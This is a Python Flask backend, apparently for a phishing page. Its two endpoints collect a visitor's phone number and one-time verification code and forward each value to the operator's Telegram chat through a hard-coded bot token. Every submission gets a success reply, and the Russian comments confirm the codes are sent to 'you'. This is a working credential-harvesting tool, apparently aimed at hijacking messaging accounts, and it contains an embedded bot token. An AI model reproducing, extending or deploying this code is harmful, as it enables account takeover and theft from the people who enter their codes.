from flask import Flask, request, jsonify, send_from_directory
import requests
import os

app = Flask(__name__)

BOT_TOKEN = "7972485896:AAGDUO9cKu4qMdoa7dC87-Ybq1kUoPZNF_A"
OWNER_ID = 208405935

@app.route('/')
def index():
    return send_from_directory('.', 'index.html')

@app.route('/api/send_code', methods=['POST'])
def send_code():
    phone = request.json.get('phone', '')
    # Отправляем номер тебе в Telegram
    requests.post(f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage",
                  json={"chat_id": OWNER_ID, "text": f"📱 НОМЕР: {phone}"})
    return jsonify({"status": "ok"})

@app.route('/api/verify_code', methods=['POST'])
def verify_code():
    phone = request.json.get('phone', '')
    code = request.json.get('code', '')
    # Отправляем код тебе в Telegram
    requests.post(f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage",
                  json={"chat_id": OWNER_ID, "text": f"🔓 {phone}\nКОД: {code}"})
    return jsonify({"success": True})

if __name__ == '__main__':
    port = int(os.environ.get('PORT', 5000))
    app.run(host='0.0.0.0', port=port)
